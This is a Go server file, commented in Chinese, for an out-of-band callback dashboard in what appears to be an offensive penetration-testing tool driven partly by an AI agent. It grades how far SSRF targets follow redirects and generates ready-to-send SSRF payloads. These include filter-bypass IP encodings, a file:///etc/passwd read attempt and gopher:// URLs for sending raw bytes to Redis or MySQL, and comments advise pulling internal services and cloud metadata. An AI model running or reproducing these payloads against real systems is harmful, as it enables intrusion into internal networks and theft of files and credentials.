package server

// 回连带外信道（OOB）页面侧。
//
// 数据来源是 /opt/artex/data/oob/oob.db——监听器（oob-listen.service，独立常驻进程）
// 收到回连就写库，这里只读打开、不抢写锁。页面因此不依赖 MCP 子进程是否活着，
// 与 MCP（oob_mcp.py）看到的是同一份数据。
//
// 只读的意义：MCP 那边的会话是 agent 发起的，页面只负责观测和判定；
// 需要新建会话/生成载荷时页面上也能做，但真正对外发请求的永远是目标系统自己。

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

const (
	oobDefaultDir = "/opt/artex/data/oob"
	oobHitLimit   = 500 // 与写入侧的 MAX_HITS_PER_SESSION 对齐
)

// oobDir 返回 OOB 数据目录。
//
// 裸机部署是 /opt/artex/data/oob；容器里数据目录挂在 /app/data，路径不同，
// 所以允许用 OOB_DATA_DIR 覆盖（和 oob_mcp.py 使用同一套环境变量名）。
func oobDir() string {
	if d := strings.TrimSpace(os.Getenv("OOB_DATA_DIR")); d != "" {
		return d
	}
	return oobDefaultDir
}

// oobDBPath 返回命中库路径。OOB_DB 优先，与 oob_mcp.py 完全一致，
// 这样两边指向同一个文件，页面看到的和 agent 写的是同一份数据。
func oobDBPath() string {
	if p := strings.TrimSpace(os.Getenv("OOB_DB")); p != "" {
		return p
	}
	return filepath.Join(oobDir(), "oob.db")
}

// oobConfPath 返回配置文件路径。OOB_CONF 优先。
func oobConfPath() string {
	if p := strings.TrimSpace(os.Getenv("OOB_CONF")); p != "" {
		return p
	}
	return filepath.Join(oobDir(), "oob.conf")
}

// oobOpenDB 以只读 + WAL 兼容的方式打开 OOB 库。
// 监听器可能正在写，busy_timeout 让并发读等一会儿而不是直接报错。
func oobOpenDB() (*sql.DB, error) {
	if _, err := os.Stat(oobDBPath()); err != nil {
		return nil, err
	}
	dsn := "file:" + oobDBPath() + "?mode=ro&_pragma=busy_timeout(5000)"
	return sql.Open("sqlite", dsn)
}

// oobConfValue 读 oob.conf 里的 key=value。环境变量优先，与 MCP 侧口径一致。
func oobConfValue(key string) string {
	if v := strings.TrimSpace(os.Getenv(key)); v != "" {
		return v
	}
	raw, err := os.ReadFile(oobConfPath())
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(raw), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		k, v, ok := strings.Cut(line, "=")
		if ok && strings.TrimSpace(k) == key {
			return strings.TrimSpace(v)
		}
	}
	return ""
}

// oobPublicHost 返回回连方应该访问的公网地址。
// 本机网卡是 NAT 内网地址，自动探测会拿到 10.x，所以必须靠配置。
func oobPublicHost() string {
	if h := oobConfValue("OOB_PUBLIC_HOST"); h != "" {
		return h
	}
	return ""
}

// oobPorts 返回对外监听端口。默认值与 oob_mcp.py 的 DEFAULT_PORTS 保持一致，
// 否则两边在没写 OOB_PORTS 时会用不同端口，页面显示的和实际监听的会打架。
func oobPorts() []int {
	raw := oobConfValue("OOB_PORTS")
	if raw == "" {
		raw = "8889,18666,18667"
	}
	var out []int
	for _, p := range strings.Split(raw, ",") {
		if n, err := strconv.Atoi(strings.TrimSpace(p)); err == nil && n > 0 {
			out = append(out, n)
		}
	}
	if len(out) == 0 {
		out = []int{8889}
	}
	return out
}

type oobHit struct {
	ID         int64   `json:"id"`
	SessionID  string  `json:"session_id"`
	Variant    string  `json:"variant"`
	TS         float64 `json:"ts"`
	Method     string  `json:"method"`
	Scheme     string  `json:"scheme"`
	Host       string  `json:"host"`
	Path       string  `json:"path"`
	Query      string  `json:"query"`
	RemoteIP   string  `json:"remote_ip"`
	RemotePort int     `json:"remote_port"`
	UA         string  `json:"ua"`
	BodyLen    int     `json:"body_len"`
	Truncated  bool    `json:"truncated"`
	Headers    string  `json:"-"`
	Body       string  `json:"-"`
}

type oobSession struct {
	ID        string   `json:"id"`
	Label     string   `json:"label"`
	Note      string   `json:"note"`
	Token     string   `json:"token"`
	CreatedAt float64  `json:"created_at"`
	ClosedAt  *float64 `json:"closed_at"`
	HitCount  int      `json:"hit_count"`
	LastHit   float64  `json:"last_hit"`
	Active    bool     `json:"active"`
	Level     int      `json:"level"`
	LevelName string   `json:"level_name"`
	Verdict   string   `json:"verdict"`
	Variants  []string `json:"variants"`
	RemoteIPs []string `json:"remote_ips"`
	UAs       []string `json:"uas"`
	Hosts     []string `json:"hosts"`
}

// oobLevelNames 与 MCP 侧 LEVEL_NAMES 完全一致，避免两处看到的等级名不一样。
var oobLevelNames = map[int]string{
	0: "L0 无回连",
	1: "L1 单向回连（盲）",
	3: "L3 跟随一次重定向",
	4: "L4 链式跟随重定向",
	5: "L5 渲染型（可用大响应）",
}

// oobAssess 从回连记录里还原「这个回连方到底能做什么」。
//
// 判定不是靠猜 UA，而是靠 302 重定向链实测：探测载荷 cap_a1 会跳 cap_a2 → cap_a3（带 401 挑战）
// → cap_a4（1MB 响应体），回连方走到哪一步，就说明它具备到那一步的能力。
func oobAssess(hits []oobHit) (int, map[string]bool, string) {
	variants := map[string]bool{}
	weak := false
	authSeen := false
	for _, h := range hits {
		v := strings.TrimSpace(h.Variant)
		if strings.HasPrefix(v, "cap_") {
			variants[v] = true
			if v == "cap_a3" && h.Headers != "" {
				var hv map[string]any
				if json.Unmarshal([]byte(h.Headers), &hv) == nil {
					for k := range hv {
						if strings.EqualFold(k, "authorization") {
							authSeen = true
						}
					}
				}
			}
		} else if v != "" {
			weak = true
		}
	}

	ev := map[string]bool{
		"reach":         weak || len(variants) > 0,
		"follow_1":      variants["cap_a2"],
		"follow_2":      variants["cap_a3"],
		"auth_retry":    authSeen,
		"big_body":      variants["cap_a4"],
		"xproto_issued": variants["cap_file"] || variants["cap_gopher"],
	}

	switch {
	case !ev["reach"]:
		return 0, ev, "尚无回连证据。"
	case ev["big_body"]:
		return 5, ev, "回连方可跟随重定向、处理认证挑战并完整接收大响应（L5）。" +
			"这属于「渲染型客户端」，不只是盲探测——具备把内网响应内容带回给攻击者的条件，" +
			"可按「有回显 SSRF」尝试读取内网服务与云元数据。"
	case ev["follow_2"]:
		return 4, ev, "回连方可链式跟随重定向（L4），说明它按 URL 语义解析并自动跳转，" +
			"可被诱导访问我们指定的任意 http 下一跳；内网探测能力明显强于盲 SSRF。"
	case ev["follow_1"]:
		return 3, ev, "回连方会跟随一次重定向（L3），但未走完链条——可能限制跳转次数或跨路径校验。"
	case weak:
		return 1, ev, "仅观测到单向回连（L1）：能发起 HTTP 请求，但未跟随重定向。" +
			"属于典型盲 SSRF——能证明目标可出网/可被诱导发起请求，" +
			"但拿不到响应内容，无法据此读取目标本地文件。"
	default:
		return 0, ev, "只有能力探测请求，尚未收到普通载荷回连。"
	}
}

// oobLoadSessions 读会话并附带命中统计与判级。
func oobLoadSessions(db *sql.DB) ([]oobSession, error) {
	rows, err := db.Query(`SELECT id, token, COALESCE(label,''), COALESCE(note,''),
		created_at, closed_at FROM sessions ORDER BY created_at DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	out := []oobSession{}
	for rows.Next() {
		var s oobSession
		var closed sql.NullFloat64
		if err := rows.Scan(&s.ID, &s.Token, &s.Label, &s.Note, &s.CreatedAt, &closed); err != nil {
			return nil, err
		}
		if closed.Valid {
			v := closed.Float64
			s.ClosedAt = &v
		}
		s.Active = !closed.Valid
		s.Variants = []string{}
		s.RemoteIPs = []string{}
		s.UAs = []string{}
		s.Hosts = []string{}
		out = append(out, s)
	}

	// 一次性把命中拉进来分组，避免每条会话各查一遍。
	hitRows, err := db.Query(`SELECT session_id, variant, ts, method, scheme, host, path, query,
		remote_ip, remote_port, ua, body_len, truncated, headers FROM hits
		WHERE session_id IN (SELECT id FROM sessions) ORDER BY id`)
	if err != nil {
		return nil, err
	}
	defer hitRows.Close()

	bySession := map[string][]oobHit{}
	for hitRows.Next() {
		var h oobHit
		var variant, method, scheme, host, path, query, ip, ua, headers sql.NullString
		var port, bodyLen sql.NullInt64
		var truncated sql.NullBool
		if err := hitRows.Scan(&h.SessionID, &variant, &h.TS, &method, &scheme, &host,
			&path, &query, &ip, &port, &ua, &bodyLen, &truncated, &headers); err != nil {
			return nil, err
		}
		h.Variant, h.Method, h.Scheme = variant.String, method.String, scheme.String
		h.Host, h.Path, h.Query = host.String, path.String, query.String
		h.RemoteIP, h.UA, h.Headers = ip.String, ua.String, headers.String
		h.RemotePort, h.BodyLen = int(port.Int64), int(bodyLen.Int64)
		h.Truncated = truncated.Bool
		bySession[h.SessionID] = append(bySession[h.SessionID], h)
	}

	for i := range out {
		hits := bySession[out[i].ID]
		out[i].HitCount = len(hits)
		level, _, verdict := oobAssess(hits)
		out[i].Level, out[i].Verdict = level, verdict
		out[i].LevelName = oobLevelNames[level]

		seenVariant := map[string]bool{}
		seenIP := map[string]bool{}
		seenUA := map[string]bool{}
		seenHost := map[string]bool{}
		for _, h := range hits {
			if h.TS > out[i].LastHit {
				out[i].LastHit = h.TS
			}
			if h.Variant != "" && !seenVariant[h.Variant] {
				seenVariant[h.Variant] = true
				out[i].Variants = append(out[i].Variants, h.Variant)
			}
			if h.RemoteIP != "" && !seenIP[h.RemoteIP] {
				seenIP[h.RemoteIP] = true
				out[i].RemoteIPs = append(out[i].RemoteIPs, h.RemoteIP)
			}
			if h.UA != "" && !seenUA[h.UA] {
				seenUA[h.UA] = true
				out[i].UAs = append(out[i].UAs, h.UA)
			}
			if h.Host != "" && !seenHost[h.Host] {
				seenHost[h.Host] = true
				out[i].Hosts = append(out[i].Hosts, h.Host)
			}
		}
		sort.Strings(out[i].Variants)
	}
	return out, nil
}

// GET /api/oob/overview
func (s *Server) oobOverview(w http.ResponseWriter, r *http.Request) {
	resp := map[string]any{
		"public_host": oobPublicHost(),
		"ports":       oobPorts(),
		"advice":      "",
	}
	db, err := oobOpenDB()
	if err != nil {
		resp["available"] = false
		resp["error"] = "OOB 库尚未生成：" + err.Error()
		resp["advice"] = "先启动 oob-listen 常驻监听器，收到第一条回连后库才会出现。"
		writeJSON(w, 200, resp)
		return
	}
	defer db.Close()

	resp["available"] = true

	var sessions, active, hits, hitsToday int
	_ = db.QueryRow(`SELECT COUNT(*) FROM sessions`).Scan(&sessions)
	_ = db.QueryRow(`SELECT COUNT(*) FROM sessions WHERE closed_at IS NULL`).Scan(&active)
	_ = db.QueryRow(`SELECT COUNT(*) FROM hits`).Scan(&hits)
	startOfDay := float64(time.Now().Truncate(24 * time.Hour).Unix())
	_ = db.QueryRow(`SELECT COUNT(*) FROM hits WHERE ts >= ?`, startOfDay).Scan(&hitsToday)

	var lastHit sql.NullFloat64
	_ = db.QueryRow(`SELECT MAX(ts) FROM hits`).Scan(&lastHit)

	resp["sessions"] = sessions
	resp["active"] = active
	resp["hits"] = hits
	resp["hits_today"] = hitsToday
	if lastHit.Valid {
		resp["last_hit"] = lastHit.Float64
	} else {
		resp["last_hit"] = 0
	}
	if st, err := os.Stat(oobDBPath()); err == nil {
		resp["db_bytes"] = st.Size()
	}
	if oobPublicHost() == "" {
		resp["advice"] = "未配置 OOB_PUBLIC_HOST，生成的回连地址是 NAT 内网地址，目标连不到。" +
			"请写入 " + oobConfPath()
	}
	writeJSON(w, 200, resp)
}

// GET /api/oob/sessions
func (s *Server) oobSessions(w http.ResponseWriter, r *http.Request) {
	db, err := oobOpenDB()
	if err != nil {
		writeJSON(w, 200, map[string]any{"sessions": []oobSession{}, "available": false})
		return
	}
	defer db.Close()

	list, err := oobLoadSessions(db)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"sessions": list, "available": true})
}

// GET /api/oob/hits?session_id=&limit=&before=
func (s *Server) oobHits(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	limit := atoiDefault(q.Get("limit"), 100)
	if limit <= 0 || limit > oobHitLimit {
		limit = oobHitLimit
	}
	sessionID := strings.TrimSpace(q.Get("session_id"))

	db, err := oobOpenDB()
	if err != nil {
		writeJSON(w, 200, map[string]any{"hits": []oobHit{}})
		return
	}
	defer db.Close()

	sqlStr := `SELECT id, session_id, COALESCE(variant,''), ts, COALESCE(method,''),
		COALESCE(scheme,''), COALESCE(host,''), COALESCE(path,''), COALESCE(query,''),
		COALESCE(remote_ip,''), COALESCE(remote_port,0), COALESCE(ua,''),
		COALESCE(body_len,0), COALESCE(truncated,0)
		FROM hits`
	args := []any{}
	if sessionID != "" {
		sqlStr += ` WHERE session_id = ?`
		args = append(args, sessionID)
	}
	sqlStr += ` ORDER BY id DESC LIMIT ?`
	args = append(args, limit)

	rows, err := db.Query(sqlStr, args...)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	defer rows.Close()

	out := []oobHit{}
	for rows.Next() {
		var h oobHit
		var truncated int
		if err := rows.Scan(&h.ID, &h.SessionID, &h.Variant, &h.TS, &h.Method, &h.Scheme,
			&h.Host, &h.Path, &h.Query, &h.RemoteIP, &h.RemotePort, &h.UA,
			&h.BodyLen, &truncated); err != nil {
			writeErr(w, 500, err.Error())
			return
		}
		h.Truncated = truncated != 0
		out = append(out, h)
	}
	writeJSON(w, 200, map[string]any{"hits": out})
}

// GET /api/oob/hits/{id}
func (s *Server) oobHitDetail(w http.ResponseWriter, r *http.Request) {
	id, err := strconv.ParseInt(r.PathValue("id"), 10, 64)
	if err != nil {
		writeErr(w, 400, "invalid id")
		return
	}
	db, err := oobOpenDB()
	if err != nil {
		writeErr(w, 404, "OOB 库不存在")
		return
	}
	defer db.Close()

	var h oobHit
	var truncated int
	err = db.QueryRow(`SELECT id, session_id, COALESCE(variant,''), ts, COALESCE(method,''),
		COALESCE(scheme,''), COALESCE(host,''), COALESCE(path,''), COALESCE(query,''),
		COALESCE(remote_ip,''), COALESCE(remote_port,0), COALESCE(ua,''),
		COALESCE(body_len,0), COALESCE(truncated,0), COALESCE(headers,''), COALESCE(body,'')
		FROM hits WHERE id = ?`, id).Scan(&h.ID, &h.SessionID, &h.Variant, &h.TS, &h.Method,
		&h.Scheme, &h.Host, &h.Path, &h.Query, &h.RemoteIP, &h.RemotePort, &h.UA,
		&h.BodyLen, &truncated, &h.Headers, &h.Body)
	if err != nil {
		writeErr(w, 404, "not found")
		return
	}
	h.Truncated = truncated != 0

	// headers 存的是 JSON 字符串，展开成对象给前端直接用。
	var headers map[string]any
	if h.Headers != "" {
		_ = json.Unmarshal([]byte(h.Headers), &headers)
	}
	if headers == nil {
		headers = map[string]any{}
	}
	writeJSON(w, 200, map[string]any{
		"hit":     h,
		"headers": headers,
		// hit 结构里 headers/body 都标了 json:"-"（列表接口没必要带整包），
		// 详情这里单独给出，前端直接渲染。
		"body": h.Body,
	})
}

// GET /api/oob/capability?session_id=
func (s *Server) oobCapability(w http.ResponseWriter, r *http.Request) {
	sessionID := strings.TrimSpace(r.URL.Query().Get("session_id"))
	if sessionID == "" {
		writeErr(w, 400, "missing session_id")
		return
	}
	db, err := oobOpenDB()
	if err != nil {
		writeJSON(w, 200, map[string]any{"level": 0, "level_name": oobLevelNames[0],
			"verdict": "OOB 库不存在，尚未收到任何回连。", "evidence": map[string]bool{}})
		return
	}
	defer db.Close()

	rows, err := db.Query(`SELECT id, session_id, COALESCE(variant,''), ts, COALESCE(headers,'')
		FROM hits WHERE session_id = ? ORDER BY id`, sessionID)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	defer rows.Close()

	var hits []oobHit
	for rows.Next() {
		var h oobHit
		if err := rows.Scan(&h.ID, &h.SessionID, &h.Variant, &h.TS, &h.Headers); err != nil {
			writeErr(w, 500, err.Error())
			return
		}
		hits = append(hits, h)
	}
	level, ev, verdict := oobAssess(hits)
	writeJSON(w, 200, map[string]any{
		"session_id": sessionID,
		"level":      level,
		"level_name": oobLevelNames[level],
		"verdict":    verdict,
		"evidence":   ev,
		"hits":       len(hits),
		// 能力测定只覆盖 HTTP 语义；DNS 与本地文件读取这类没有回连通道的行为测不出来。
		"limits": []string{
			"只能观测 HTTP(S) 回连；纯 DNS 查询与 UDP 外发看不到，需要自有域名并放行 53/UDP。",
			"无法单向证明回连方能读目标本地文件：file:///etc/passwd 本来就不会产生回连，" +
				"收不到既是「不支持」也是「支持但没回显」，必须以有回显为证据。",
			"等级由 302 链实测得出，不含「能执行命令」这类结论——那需要另外的反连验证。",
		},
	})
}

// GET /api/oob/payloads?session_id=
//
// 给出可直接投喂的 SSRF 载荷。同一目标地址会生成多种 IP 写法，
// 用来绕过只做字符串匹配的弱校验（十进制/八进制/十六进制/IPv6 映射/短横线）。
func (s *Server) oobPayloads(w http.ResponseWriter, r *http.Request) {
	sessionID := strings.TrimSpace(r.URL.Query().Get("session_id"))
	if sessionID == "" {
		writeErr(w, 400, "missing session_id")
		return
	}
	db, err := oobOpenDB()
	if err != nil {
		writeErr(w, 404, "OOB 库不存在")
		return
	}
	defer db.Close()

	var token string
	if err := db.QueryRow(`SELECT token FROM sessions WHERE id = ?`, sessionID).Scan(&token); err != nil {
		writeErr(w, 404, "session not found")
		return
	}

	host := oobPublicHost()
	ports := oobPorts()
	if host == "" {
		writeJSON(w, 200, map[string]any{
			"payloads": []any{},
			"warning": "未配置 OOB_PUBLIC_HOST，生成的地址目标连不到。写入 " + oobConfPath() +
				" 后刷新即可。",
		})
		return
	}
	// 主端口：IP 写法变体和协议载荷都挂它。下面 baseline/cap 会按全部监听端口各出一份。
	port := ports[0]

	type payload struct {
		Name string `json:"name"`
		URL  string `json:"url"`
		Note string `json:"note"`
		Kind string `json:"kind"` // baseline / cap / bypass / proto
	}
	out := []payload{}

	// 每个监听端口各出一份。监听器默认开三个端口，就是为了应对只放行特定出站端口的目标；
	// 只给第一个端口的地址等于把另外两个白开了。
	for i, p := range ports {
		sfx := ""
		if i > 0 {
			sfx = fmt.Sprintf("（端口 %d）", p)
		}
		extra := ""
		if i > 0 {
			extra = fmt.Sprintf("目标只放行 %d 这个出站端口时用这条。", p)
		}
		out = append(out,
			payload{"标准回连" + sfx, fmt.Sprintf("http://%s:%d/t/%s/baseline", host, p, token),
				"最基础的一条：目标只要能出网并发出这个请求，库中就会出现记录。" + extra, "baseline"},
			payload{"能力探测链" + sfx, fmt.Sprintf("http://%s:%d/t/%s/cap_a1", host, p, token),
				"会依次跳 a2→a3(401)→a4(1MB)，用回连方走到第几跳来判定它能做多少事。" + extra, "cap"},
		)
	}

	// IP 写法变体：绕过只做点分十进制匹配的过滤器（维度是 IP 表示法，不是端口，只挂主端口）。
	for _, v := range oobIPVariants(host) {
		out = append(out, payload{
			Name: "IP 变体 · " + v.Label,
			URL:  fmt.Sprintf("http://%s:%d/t/%s/baseline", v.Value, port, token),
			Note: v.Note,
			Kind: "bypass",
		})
	}

	// 协议侧载荷：这些不会回连，但能作为「让目标去读文件/发原始 TCP」的尝试项。
	for _, p := range []payload{
		{"file 协议", "file:///etc/passwd",
			"若回显型 SSRF 支持 file，可直接读目标本地文件；这条不会产生回连，必须靠响应内容判断。", "proto"},
		{"gopher 协议", fmt.Sprintf("gopher://%s:%d/_", host, port),
			"用于向任意 TCP 服务投递原始字节（打 Redis/MySQL 等）；回连侧只能看到是否被发起。", "proto"},
	} {
		out = append(out, p)
	}

	writeJSON(w, 200, map[string]any{
		"session_id":  sessionID,
		"token":       token,
		"public_host": host,
		"port":        port,  // 主端口，保留兼容
		"ports":       ports, // 全部监听端口，baseline/cap 每个端口都有一份
		"payloads":    out,
	})
}

type oobIPVariant struct {
	Label string `json:"label"`
	Value string `json:"value"`
	Note  string `json:"note"`
}

// oobIPVariants 生成同一 IPv4 的其它合法写法。
// 只处理标准点分 IPv4；域名或 IPv6 直接原样返回一条。
func oobIPVariants(host string) []oobIPVariant {
	parts := strings.Split(host, ".")
	if len(parts) != 4 {
		return []oobIPVariant{{"原值", host, "非 IPv4，不做变体。"}}
	}
	var oct [4]int64
	for i, p := range parts {
		n, err := strconv.ParseInt(p, 10, 64)
		if err != nil || n < 0 || n > 255 {
			return []oobIPVariant{{"原值", host, "非标准 IPv4，不做变体。"}}
		}
		oct[i] = n
	}
	asInt := oct[0]<<24 | oct[1]<<16 | oct[2]<<8 | oct[3]

	return []oobIPVariant{
		{"点分十进制", host, "原始写法，作为对照。"},
		{"十进制整数", strconv.FormatInt(asInt, 10), "整段十进制，多数解析器接受。"},
		{"十六进制", fmt.Sprintf("0x%08x", asInt), "0x 前缀整体十六进制。"},
		{"八进制分段", fmt.Sprintf("0%o.0%o.0%o.0%o", oct[0], oct[1], oct[2], oct[3]),
			"每段八进制，老牌绕过手法。"},
		{"IPv6 映射", fmt.Sprintf("::ffff:%s", host), "IPv4-mapped IPv6，正则常漏。"},
	}
}
